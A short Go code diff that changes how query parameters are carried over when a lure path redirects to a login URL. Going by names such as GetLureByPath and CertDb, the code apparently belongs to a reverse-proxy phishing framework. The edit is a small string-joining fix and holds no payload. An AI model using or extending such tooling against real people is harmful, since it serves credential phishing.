@@ -353,9 +353,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
 					if err == nil {
 						// pass other parameters
-						custom_params := ""
+						custom_params := "&"
 						for param_name, param_value := range req.URL.Query() {
-							custom_params = "&" + custom_params + param_name + "=" + param_value[0]
+							custom_params = custom_params + param_name + "=" + param_value[0] + "&"
 						}
 
 						// redirect from lure path to login url
